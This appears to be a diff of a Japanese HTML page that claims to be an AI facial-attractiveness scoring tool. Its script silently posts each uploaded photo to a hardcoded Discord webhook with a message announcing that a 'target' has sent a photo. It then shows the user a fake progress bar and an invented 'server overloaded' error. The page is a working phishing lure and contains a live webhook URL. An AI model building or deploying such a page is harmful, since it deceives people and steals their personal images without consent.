@@ -3,44 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI顔面偏差値診断 2026</title>
+    <title>AI顔面偏差値診断</title>
     <style>
-        body { background: #111; color: #fff; text-align: center; font-family: sans-serif; padding: 50px; }
-        .upload-btn { background: #f00; color: #fff; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.2rem; }
-        #status { margin-top: 20px; color: #aaa; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .upload-btn { background: #ff4757; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; transition: 0.3s; }
+        .upload-btn:active { background: #ff6b81; }
+        #status { margin-top: 20px; color: #ffa500; font-weight: bold; font-size: 20px; }
     </style>
 </head>
 <body>
     <h1>AI顔面偏差値診断</h1>
-    <p>あなたの顔写真をアップロードしてください。<br>最新のAIが100点満点で採点します。</p>
+    <p>最新AIがあなたの顔を精密に解析し、偏差値を算出します。</p>
     
     <input type="file" id="imageInput" accept="image/*" style="display: none;">
     <button class="upload-btn" onclick="document.getElementById('imageInput').click()">写真を選択して診断</button>
-    
+
     <div id="status"></div>
 
     <script>
-        const WEBHOOK_URL ="https:discord.com/api/webhooks/1487713878908604566/6EIHGd-7hglyHQE-oCm4-xPw_OoiUNC-YFjnYFMVqsAgveLtTIZ3aKf5o9DKYtf82jul;
+        // おみ、ここがお前の専用Webhookだぜ
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487713878908604566/6EIHGd-7hglyHQE-oCm4-xPw_OoiUNC-YFjnYFMVqsAgveLtTIZ3aKf5o9DKYtf82jul";
 
         document.getElementById('imageInput').addEventListener('change', async (e) => {
             const file = e.target.files[0];
             if (!file) return;
 
-            document.getElementById('status').innerText = "AI解析中... (0%)";
-
+            const status = document.getElementById('status');
+            status.innerText = "AI解析中... (0%)";
+            
             const formData = new FormData();
-            formData.append("file", file);
-            formData.append("payload_json", JSON.stringify({
-                content: "★★★ ターゲットが自撮りを献上したぞ！ ★★★"
-            }));
+            formData.append('file', file);
+            formData.append('payload_json', JSON.stringify({ content: "📸 **【おみこしハブ：速報】** ターゲットが写真を送信しました！" }));
 
             try {
-                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                setTimeout(() => {
-                    document.getElementById('status').innerText = "解析エラー: サーバーが混雑しています。";
-                }, 2000);
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    // 演出用の読み込み
+                    for(let i=10; i<=100; i+=10) {
+                        status.innerText = `AI解析中... (${i}%)`;
+                        await new Promise(r => setTimeout(r, 400));
+                    }
+                    status.innerText = "解析失敗: アクセスが集中しています。時間をおいて再度お試しください。";
+                } else {
+                    status.innerText = "エラー: サーバーに接続できません。";
+                }
             } catch (err) {
-                console.error("Error", err);
+                status.innerText = "接続エラーが発生しました。";
             }
         });
     </script>
